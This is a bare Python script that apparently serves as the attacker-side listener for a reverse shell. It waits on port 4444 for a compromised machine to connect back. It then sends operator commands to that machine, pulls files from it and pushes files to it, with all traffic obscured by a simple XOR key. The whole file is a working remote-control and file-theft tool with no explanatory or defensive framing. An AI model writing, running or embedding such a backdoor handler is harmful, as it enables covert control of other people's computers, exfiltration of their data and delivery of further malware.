import socket
import os

host = "0.0.0.0"
port = 4444

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((host,port))
s.listen(1)

print(f"[*] waiting for connection on port {port}...")
client, addr = s.accept()
client.settimeout(5)
print(f"[+] connection from {addr}")

def xor(data,key="sudoxs"):
    return bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(data)])

done_marker = xor(b"DONE")
def download_file(filename):
    with open(filename,"wb") as f:
        while True:
            try:
                data = client.recv(1024)
            except socket.timeout:
                break
            decrypted = xor(data)
            if decrypted.endswith(done_marker):
                f.write(decrypted[:-len(done_marker)])
                break
            f.write(decrypted)
    print(f"[+] donwload: {filename}")

def upload_file(filename):
    if not os.path.exists(filename):
        print(f"[-] file not found")
        return
    with open(filename, "rb") as f:
        while True:
            data = f.read(1024)
            if not data:
                break
            encrypted = xor(data)
            client.send(encrypted)
        client.send(xor(b"DONE"))
    print(f"[+] uploead: {filename}")

try:
    while True:
        command = input(">>")
        encrypted_command = xor(command.encode())
        if command == "exit":
            client.send(encrypted_command)
            client.shutdown(socket.SHUT_RDWR)
            client.close()
            break

        elif command.startswith("download"):
            client.send(encrypted_command)
            filename = command.split(" ",1)[1]
            download_file(filename)
        elif command.startswith("upload"):
            client.send(encrypted_command)
            filename = command.split(" ",1)[1]
            upload_file(filename)
        else:
            client.send(encrypted_command)
            try:
                response = client.recv(4096)
            except socket.timeout:
                break
            print(response.decode(errors="ignore"))

except KeyboardInterrupt:
    print("\n[-] interupted")

client.close()

